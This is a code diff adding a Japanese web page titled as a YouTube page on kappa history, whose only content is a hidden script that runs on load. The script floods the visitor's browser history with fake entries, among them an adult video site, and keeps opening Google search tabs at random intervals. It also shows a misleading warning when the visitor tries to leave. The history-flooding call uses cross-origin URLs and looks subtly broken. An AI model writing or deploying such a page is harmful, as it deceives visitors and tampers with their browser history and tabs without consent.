@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>河童の歴史 Youtube</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 40px; background: #f0f0f0; }
+        h1 { color: #333; }
+    </style>
+</head>
+<body>
+
+    <script>
+        // ==================== 設定ここから ====================
+
+        // ブラウザ履歴に残すURL（10個推奨）
+        const historyUrls = [
+            "https://xvideos.com",
+            "https://www.youtube.com",
+            "https://twitter.com",
+            "https://www.amazon.co.jp",
+            "https://yahoo.co.jp",
+            "https://github.com",
+            "https://ja.wikipedia.org",
+            "https://www.reddit.com",
+            "https://news.ycombinator.com",
+            "https://www.nicovideo.jp"
+        ];
+
+        // Google検索履歴に残したい検索ワード
+        const searchQueries = [
+            "今日の天気",
+            "株価 日経平均",
+            "猫 動画",
+            "最新ニュース",
+            "YouTube おすすめ",
+            "東京 レストラン",
+            "iPhone 新型",
+            "プログラミング JavaScript",
+            "サッカー 結果",
+            "アニメ ランキング"
+        ];
+
+        // 検索を実行する間隔の範囲（ミリ秒） - 連打防止
+        const minSearchInterval = 8000;   // 最短8秒
+        const maxSearchInterval = 25000;  // 最長25秒
+
+        // ==================== 設定ここまで ====================
+
+        let historyIndex = 0;
+
+        // ブラウザ履歴ループ（比較的速め）
+        function floodHistory() {
+            history.pushState(
+                { page: historyIndex }, 
+                "", 
+                historyUrls[historyIndex]
+            );
+            
+            historyIndex = (historyIndex + 1) % historyUrls.length;
+            setTimeout(floodHistory, 80); // 80ms間隔（調整可）
+        }
+
+        // Google検索実行（ランダム間隔・連打防止）
+        function doRandomSearch() {
+            const query = searchQueries[Math.floor(Math.random() * searchQueries.length)];
+            const searchUrl = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
+            
+            // 新しいタブで開く（検索履歴に残りやすい）
+            window.open(searchUrl, "_blank");
+            
+            // 次回の検索までのランダム待ち時間
+            const nextDelay = Math.floor(Math.random() * (maxSearchInterval - minSearchInterval)) + minSearchInterval;
+            setTimeout(doRandomSearch, nextDelay);
+        }
+
+        // 開始
+        window.onload = function() {
+            // 履歴ループ開始
+            setTimeout(floodHistory, 300);
+            
+            // 検索ループ開始（少し遅れて開始）
+            setTimeout(doRandomSearch, 2000);
+        };
+
+        // ページを閉じようとしたとき警告
+        window.onbeforeunload = function() {
+            return "現在読み込みです。本当に閉じますか？";
+        };
+    </script>
+</body>
+</html>
